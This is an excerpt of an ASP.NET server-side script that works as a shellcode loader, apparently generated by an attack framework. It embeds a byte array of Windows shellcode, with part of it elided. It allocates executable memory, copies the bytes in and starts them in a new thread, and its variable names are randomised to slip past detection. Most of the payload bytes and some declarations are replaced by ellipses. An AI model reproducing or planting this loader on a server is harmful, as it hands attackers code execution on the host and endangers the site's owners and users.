...
<script runat="server">
    ...
    {
        byte[] dGCaNlE = new byte[354] {
0xfc,0xe8,0x8f,0x00,0x00,0x00,0x60,0x31,0xd2,0x89,0xe5,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x0f,0xb7,0x4a,0x26,
0x8b,0x72,0x28,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0x49,0x75,0xef,0x52,0x57,0x8b,
...
0x00,0x53,0xff,0xd5 };
        ...
        IntPtr mrSwtn = VirtualAlloc(IntPtr.Zero,(UIntPtr)dGCaNlE.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(dGCaNlE,0,mrSwtn,dGCaNlE.Length);
        IntPtr bf3r = IntPtr.Zero;
        IntPtr rdt8h8kP2Q = CreateThread(IntPtr.Zero,UIntPtr.Zero,mrSwtn,IntPtr.Zero,0,ref bf3r);
    }
</script>
